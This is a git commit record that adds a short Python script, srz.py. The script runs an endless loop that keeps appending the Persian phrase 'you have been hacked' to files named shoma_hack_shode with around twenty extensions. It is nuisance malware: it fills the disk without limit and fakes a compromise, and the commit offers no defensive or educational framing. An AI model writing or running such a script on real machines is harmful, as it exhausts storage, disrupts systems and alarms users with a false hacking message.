c9ed34fa0d3f667c7ad215d91cc6c1509a8e387c
M-R-mojtaba-razavi <80198391+M-R-mojtaba-razavi@users.noreply.github.com>
2021-10-17 13:34:05 +0330

    Create srz.py

---
+++ srz.py
@@ -0,0 +1,14 @@
+list_ = [
+    'txt', 'html', 'rr', 'htmtfl', 'sdfsf', 'qlj', 'cbd',
+    'zad', 'vbb', 'xaz', 'txbmt', 'css', 'rad', 'poi', 'vdx', 'php', 'sdd', 'hvvce', 'tqeddxt', 'czcc'
+]
+while True :
+    for item in list_:
+        # from os import write
+        name_list = []
+        file_name = 'shoma_hack_shode'
+        
+        join = file_name + "." + item
+        with open(join,'a+') as file :
+            file.write("shoma hack shode")
+    name_list += [join]
